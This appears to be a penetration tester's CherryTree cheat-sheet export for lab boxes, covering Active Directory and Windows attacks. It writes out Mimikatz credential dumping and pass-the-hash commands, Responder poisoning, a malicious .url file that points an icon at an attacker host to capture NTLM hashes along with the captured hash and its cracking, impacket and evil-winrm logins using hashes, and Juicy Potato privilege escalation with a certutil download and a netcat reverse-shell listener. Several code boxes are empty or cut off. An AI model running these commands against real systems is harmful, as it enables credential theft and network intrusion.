        <node name="MIMIKATZ" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688334012" ts_lastsave="1688335156">
          <rich_text underline="single" weight="heavy">Mimikatz Commands:</rich_text>
          <rich_text>
&#13;&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#logonpasswords">logonpasswords</rich_text>
          <rich_text>: </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::logonpasswords</rich_text>
          <rich_text>)&#13;&#13;◇ Extracts passwords in memory
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth">pth</rich_text>
          <rich_text> (pass the hash):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</rich_text>
          <rich_text>&#13;&#13;◇ A fake identity is created and the faske identitt’s NTLM hash is replaced with the real one.
&#13;◇ “ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable)”
&#13;◇ “AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.”
&#13;
&#13;
&#13;• ptt (pass the ticket):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # kerberos::ptt</rich_text>
          <rich_text>&#13;&#13;◇ Enables Kerberos ticket (TGT or TGS) injection into the current session.
&#13;
&#13;
&#13;• tickets:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::tickets /export</rich_text>
          <rich_text>&#13;&#13;◇ Identifies all session Kerberos tickets and lists/exports them.
&#13;◇ sekurlsa pulls the Kerberos data from memory and can access all user session tickets on the computer.
&#13;
&#13;
&#13;• ekeys:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::ekeys</rich_text>
          <rich_text>&#13;&#13;◇ Extract the Kerberos ekeys from memory. Provides theft of a user &#13;account until the password is changed (which may be never for a &#13;Smartcard/PKI user).
&#13;
&#13;
&#13;• dpapi:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::dpapi</rich_text>
          <rich_text>
&#13;• minidump:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::minidump lsass.dmp</rich_text>
          <rich_text>&#13;&#13;◇ Perform a minidump of the LSASS process and extract credential data &#13;from the lsass.dmp. A minidump can be saved off the computer for &#13;credential extraction later, but the major version of Windows must match&#13; (you can’t open the dump file from Windows 2012 on a Windows 2008 &#13;system).
&#13;
&#13;
&#13;• kerberos:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::kerberos</rich_text>
          <rich_text>&#13;&#13;◇ &#13; Extracts the smartcad/PIV PIN from memory (cached in LSASS when using a smartcard).&#13;
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege">debug:</rich_text>
          <rich_text>&#13;mimikatz # privilege::debug&#13;&#13;◇ Sets debug mode for current mimikatz session enabling LSASS access.
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=en&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com&amp;sl=fr&amp;tl=en&amp;u=http://blog.gentilkiwi.com/securite/mscache-v2-dcc2-iteration&amp;usg=ALkJrhjpLNpxdAk-QbYsP-iApIcsLGHdWA">lsadump cache</rich_text>
          <rich_text>: (requires token::elevate to be SYSTEM)&#13;mimikatz # lsadump::cache&#13;&#13;◇ Dumps cached Windows domain credentials from HKEY_LOCAL_MACHINE\SECURITY\Cache (accessible SYSTEM).

</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
&#13;
&#13;
&#13;
</rich_text>
        </node>
        <node name="Responder" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689197133" ts_lastsave="1689283651">
          <rich_text scale="h1">
LLMNR/NBT-NS/mDNS Poisoner


</rich_text>
          <rich_text scale="h2">Basic Usage:</rich_text>
          <rich_text>

Run:

sudo responder -I tun0
or 


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


And then made victim perform actions (send queries via ssrf) to posion
When a client tries to resolve a name not in the DNS, Responder will poison the LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) and spoof SMB Request in order to grab NetNTLMv2 hash.

Reference:
</rich_text>
          <rich_text link="webs https://juggernaut-sec.com/llmnr-poisoning-responder/">https://juggernaut-sec.com/llmnr-poisoning-responder/</rich_text>
          <codebox char_offset="79" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wv</codebox>
          <codebox char_offset="88" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wvfr</codebox>
        </node>
        <node name="Remote Shells for Windows" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689198163" ts_lastsave="1689286554">
          <rich_text>

</rich_text>
          <rich_text link="node 86">psexec - Passthe HAsh</rich_text>
          <rich_text>


</rich_text>
          <rich_text link="node 95">evilwinrm</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1690067048">
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where u make sure the hash is the second part of  the hash:

ex: 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



</rich_text>
          <rich_text scale="h2">Option</rich_text>
          <rich_text>


If u want to run a file on ur local kali linux directly use `-s`  option followed by  `directory location`

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

now if u have PowerView.ps1 on ur local kali/attacker machine u can run it directly on windows system


References:
1. </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/">https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/</rich_text>
          <rich_text>
2. </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</rich_text>
          <codebox char_offset="1" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -u '&lt;user&gt;' -p &lt;password&gt; -i 10.10.10.84</codebox>
          <codebox char_offset="8" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.84 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f8</codebox>
          <codebox char_offset="79" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;hash not to use&gt;:&lt;hash to actually use&gt;</codebox>
          <codebox char_offset="201" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.84 -u anirudh -p "SecureHM" -s .</codebox>
        </node>
        <node name="URI File Attack" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690061701" ts_lastsave="1690061750">
          <rich_text>
</rich_text>
          <rich_text scale="h2">URI File Attack</rich_text>
          <rich_text>
&#13;As this is a Windows host, we can use the SMB share access&#13;  to upload a file that the target system will interpret as a Windows &#13; shortcut. In this file, we can specify an icon that points to our Kali &#13; host. This should allow us to capture the user's NTLM hash when it is &#13; accessed.
&#13;We'll create a file named @hax.url with the following contents.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;When a user accesses this file, it will attempt to load &#13; the icon. This will cause a request to our Kali host for a file named &#13; with the user account's username. This request should also contain the &#13; NTLM hash of this account.
&#13;Before uploading the file to the SMB share, let's start responder to listen for the request.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;Next, let's upload our file.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;Nice, we successfully obtained the NTLM hash for a user named anirudh.&#13; User Password Brute-Force
&#13;Let's save this hash to a file and attempt to crack it using john and the rockyou.txt wordlist.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="370" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ cat @hax.url &#13;
[InternetShortcut]&#13;
URL=anything&#13;
WorkingDirectory=anything&#13;
IconFile=\\192.168.118.14\%USERNAME%.icon&#13;
IconIndex=1</codebox>
          <codebox char_offset="700" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ sudo responder -I tun0 -v&#13;
...&#13;
[+] Listening for events...&#13;
...</codebox>
          <codebox char_offset="735" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">...&#13;
smb: \&gt; put @hax.url &#13;
putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)&#13;
smb: \&gt; quit&#13;
&#13;
┌──(kali㉿kali)-[~]&#13;
└─$&#13;

&#13;After a little while, responder captures a hash.
&#13;[SMB] NTLMv2-SSP Client   : 192.168.120.116&#13;
[SMB] NTLMv2-SSP Username : VAULT\anirudh&#13;
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:9def1316e1ccodebox>
          <codebox char_offset="936" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ cat hash.txt &#13;
anirudh::VAULT:9def1316e1c
&#13;
┌──(kali㉿kali)-[~]&#13;
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt&#13;
Using default input encoding: UTF-8&#13;
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])&#13;
Will run 4 OpenMP threads&#13;
Press 'q' or Ctrl-C to abort, almost any other key for status&#13;
SecureHM         (anirudh)     &#13;
1g 0:00:00:03 DONE (2021-11-19 13:09) 0.2564g/s 2720Kp/s 2720Kc/s 2720KC/s Seifer@14..Schsutar90&#13;
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably&#13;
Session completed. </codebox>
        </node>
        <node name="Powerview" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696729392" ts_lastsave="1696730835">
          <rich_text>USing powerview

Download it:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Start power shell first:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Usage:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

To start PowerView

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

ref: </rich_text>
          <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/powershell/powerview/">https://exploit-notes.hdks.org/exploit/windows/powershell/powerview/</rich_text>
          <codebox char_offset="30" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</codebox>
          <codebox char_offset="59" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe</codebox>
          <codebox char_offset="70" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Import-Module .\PowerView.ps1</codebox>
          <codebox char_offset="93" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">. .\PowerView.ps1</codebox>
        </node>
        <node name="DACL/DC-Sync" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696734710" ts_lastsave="1697146362">
          <rich_text>check the Forest writeup for priv esc

</rich_text>
          <rich_text link="webs https://sevenlayers.com/index.php/313-hackthebox-forest-walkthrough">https://sevenlayers.com/index.php/313-hackthebox-forest-walkthrough</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521">https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521</rich_text>
          <rich_text>



PS:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


once u get the hash use it
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <codebox char_offset="186" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump htb.local/user:pass@10.10.10.84</codebox>
          <codebox char_offset="217" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.84 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e</codebox>
          <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.84 -u administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</codebox>
        </node>
        <node name="RPCClient" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698812150" ts_lastsave="1698812302">
          <rich_text>

</rich_text>
          <rich_text link="webs https://www.hackingarticles.in/active-directory-enumeration-rpcclient/">https://www.hackingarticles.in/active-directory-enumeration-rpcclient/</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="75" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">rpcclient 10.10.10.84 -U support</codebox>
        </node>
      </node>
      <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
        <rich_text underline="single" weight="heavy">Network Scanning</rich_text>
        <rich_text>

   ☐  nmap -sn 10.10.10.84
   ☐  nmap -sL 10.10.10.84
   ☐  nbtscan -r 10.10.10.84

</rich_text>
        <rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
        <rich_text>

   ☐  nmap  --top-ports 20 --open -iL iplist.txt
   ☐  nmap -sS -A -sV -O -p- 10.10.10.84
   ☐  nmap -sU 10.10.10.84
</rich_text>
      </node>
      <node name="FTP" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687687069" ts_lastsave="1687687497">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Nmap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Download all the files

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Connecting:

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 10.10.10.84</codebox>
        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@10.10.10.84'</codebox>
        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 10.10.10.84</codebox>
      </node>
      <node name="PrivEsc" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689966" ts_lastsave="1700426296">
        <node name="Linux" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689975" ts_lastsave="1687689978">
          <rich_text>• use pspy64
• use linpeas
• check sudo -l
• check SUID with the following

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
PS: A binary can be changed to </rich_text>
          <rich_text family="monospace">SUID</rich_text>
          <rich_text> by using </rich_text>
          <rich_text family="monospace">chmod u+s /bin/bash</rich_text>
          <rich_text>

• check do as via:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>

References:
◇ </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</rich_text>
          <rich_text>
◇ </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</rich_text>
          <rich_text>

  </rich_text>
          <codebox char_offset="76" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -u=s -type f 2&gt;/dev/null
or 
find / -perm -4000 2&gt;/dev/null</codebox>
          <codebox char_offset="165" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -type f -name doas.conf 2&gt;/dev/null</codebox>
        </node>
        <node name="Windows" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700426296" ts_lastsave="1701642258">
          <rich_text>
Use winpeas-ng from here:

</rich_text>
          <rich_text link="webs https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</rich_text>
          <rich_text>

_____________________________________________________________________________


Use windows exploit suggester -next generation


1. If u install it wesng via pip make sure u have the updated db.zip in the local directory
2. run this command on windows </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   and copy the output to a file, lets say sysinfo.txt
3. then run the following command in the local folder where the database.zip file is
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
to view exploit only issues

4. Either get the exploit checking elevation of privelege and get the relevant kernel exploit (start with MS )from ExploitDB. Ex

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   

or
 you check the CVE here and view the relevant kernel exploit (u can search it)

</rich_text>
          <rich_text link="webs https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</rich_text>
          <rich_text>


______________________________________________________________________________

Sherlock
</rich_text>
          <rich_text link="webs https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</rich_text>
          <rich_text>   by

1. downloading the ps1 file to Target machine </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
2. running
   a.</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   b. </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

should give u all the info
_________________________________________________________________________________

</rich_text>
          <rich_text scale="h2">Juicy potato 
</rich_text>
          <rich_text>
&#13;1. download juicy potato from here </rich_text>
          <rich_text link="webs https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</rich_text>
          <rich_text>
&#13;2. Transfer it to target via </rich_text>
          <rich_text family="monospace">certutil.exe -urlcache -f http://10.10.14.21/JuicyPotatoNG.exe jp.exe</rich_text>
          <rich_text>
&#13;3. Find ur CLSIDs from here </rich_text>
          <rich_text link="webs https://ohpe.it/juicy-potato/CLSID/">https://ohpe.it/juicy-potato/CLSID/</rich_text>
          <rich_text>
&#13;4. Start a listener </rich_text>
          <rich_text family="monospace">nc -vlp 4343</rich_text>
          <rich_text>
&#13;5. run the following to get a reverse shell:   
   `</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   Ex: `</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>`
   
   or
   
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   

   where `1337` is not the reverse shell port but a port to tell juicy potato to run stuff on ur system. Actual reverse shell with port should eb in ur `privesc.exe` file
&#13;____________________________________
also try

</rich_text>
          <rich_text link="webs https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</rich_text>
          <codebox char_offset="341" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">systeminfo</codebox>
          <codebox char_offset="483" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wes sysinfo.txt --color -e</codebox>
          <encoded_png char_offset="644" justification="left" link=""></encoded_png>
          <codebox char_offset="972" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="990" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell-import Sherlock.ps1</codebox>
          <codebox char_offset="998" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell Find-AllVulns</codebox>
          <codebox char_offset="1469" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\&lt;juicypotatofilename&gt; -p &lt;executable&gt; -l &lt;port&gt; -t * -c &lt;clsid&gt;`</codebox>
          <codebox char_offset="1483" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\jp.exe -p C:\Users\merlin\Desktop\privesc.exe -l 1337 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</codebox>
          <codebox char_offset="1503" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">jp.exe -p rev1.exe -l 1337 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</codebox>
        </node>
      </node>
      <node name="Password-Cracking" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690527" ts_lastsave="1687691201">
        <rich_text scale="h3">Cracking</rich_text>
        <rich_text> AD Hashes from ASRepRoasting

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________


</rich_text>
        <rich_text scale="h3">Cracking TGTs</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________

</rich_text>
        <rich_text scale="h3">Cracking cpassword from old computers with GPP group policy</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


___________________________-


</rich_text>
        <rich_text scale="h2">for NTLMv2 hashes</rich_text>
        <rich_text>



</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <codebox char_offset="39" justification="left" frame_width="1090" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=passwords_kerb.txt hashes.asreproast

hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 

oro1

hashcat -m 18200 unhashedgetNPUsers.log passwordlist.txt</codebox>
        <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -m 13100 hashTGT.log /opt/wordlist/rockyou.txt</codebox>
        <codebox char_offset="213" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpp-decrypt eHHHHyourReallyLongHash</codebox>
        <codebox char_offset="269" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -a 0 -m 5600 hashes.ntlmv2 /usr/share/wordlists/rockyou.txt -o cracked.txts</codebox>
      </node>
      <node name="Vulnerabilities" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690556" ts_lastsave="1687690564">
        <node name="SQLInjection" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690564" ts_lastsave="1687690570">
          <rich_text link="webs https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md">https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h3">connecting to sql</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

This prompts me to log into MySQL. I use the password given, then type:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For help check


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="95" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql -u dbuser -p password</codebox>
          <codebox char_offset="171" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">use drupaldb;</codebox>
          <codebox char_offset="191" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql --help</codebox>
        </node>
      </node>
      <node name="DNS" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700383990" ts_lastsave="1700384143">
        <rich_text scale="h2">Perform nslookup first </rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


once u know the subdomain u can use this for a dnz zonetransfer to identify more subdomains:

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="25" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nslookup 10.10.10.84 10.10.10.84 </codebox>
        <codebox char_offset="123" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig axfr @10.10.10.84cronos.htb</codebox>
      </node>
      <node name="SNMP" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1706989717" ts_lastsave="1706994186">
        <rich_text>
Use SNMP walk like:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="22" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v1 -c public 10.10.10.84</codebox>
        <codebox char_offset="29" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v2c -c public 10.10.10.84</codebox>
      </node>
    </node>
  </node>
</cherrytree>
